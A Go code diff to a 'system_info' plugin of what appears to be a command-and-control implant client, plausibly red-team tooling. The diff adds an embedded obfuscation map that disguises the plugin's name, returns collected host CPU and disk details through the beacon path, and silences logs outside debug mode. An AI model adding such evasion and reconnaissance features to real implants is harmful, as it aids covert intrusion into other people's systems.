@@ -1,6 +1,8 @@
 package main
 
 import (
+	_ "embed"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -9,8 +11,8 @@ import (
 	"strings"
 	"time"
 
-	Logger "src/Client/generic/logger"
 	"src/Client/generic/config"
+	Logger "src/Client/generic/logger"
 
 	"github.com/shirou/gopsutil/v3/cpu"
 	"github.com/shirou/gopsutil/v3/disk"
@@ -23,7 +25,28 @@ import (
 	"github.com/hashicorp/go-plugin"
 )
 
-var pluginName = "system_info"
+//go:embed obfuscate.json
+var obfuscateJSON []byte
+
+var pluginName string
+
+const pluginKey = "system_info"
+
+func init() {
+	pluginName = pluginKey
+
+	type entry struct {
+		ObfuscatedName string `json:"obfuscated_name"`
+	}
+	var m map[string]entry
+	if err := json.Unmarshal(obfuscateJSON, &m); err == nil {
+		if e, ok := m[pluginKey]; ok {
+			if n := strings.TrimSpace(e.ObfuscatedName); n != "" {
+				pluginName = n
+			}
+		}
+	}
+}
 
 type storageInfo struct {
 	DriveName  string `json:"drive_name"`
@@ -264,22 +287,22 @@ func (c *SysinfoCommandImpl) ExecuteFromSession(args []string) (string, error) {
 
 func (c *SysinfoCommandImpl) ExecuteFromBeacon(args []string, data string) (string, error) {
 	Logger.Log(fmt.Sprintf("SysinfoCommandImpl.ExecuteFromBeacon called with data: %s", data))
-	data, err := c.Execute(args)
+	out, err := c.Execute(args)
 	if err != nil {
 		Logger.Error(fmt.Sprintf("Error executing system info in beacon context: %v", err))
 		return "", err
 	}
 	Logger.Log(fmt.Sprintf("Beacon data received: %s", data))
-	return fmt.Sprintf("--- System Info (Beacon Context) ---\nBeacon Data: %s\n------------------------------------", data), nil
+	return fmt.Sprintf("--- System Info (Beacon Context) ---\nBeacon Data: %s\n%s\n------------------------------------", data, out), nil
 }
 
 func main() {
 	// Silence plugin logs unless in debug
 	var plog hclog.Logger
 	if config.IsDebug() {
-		plog = hclog.New(&hclog.LoggerOptions{ Name: "plugin.system_info", Level: hclog.Debug })
+		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.system_info", Level: hclog.Debug})
 	} else {
-		plog = hclog.New(&hclog.LoggerOptions{ Name: "plugin.system_info", Level: hclog.Off, Output: io.Discard })
+		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.system_info", Level: hclog.Off, Output: io.Discard})
 	}
 
 	plugin.Serve(&plugin.ServeConfig{
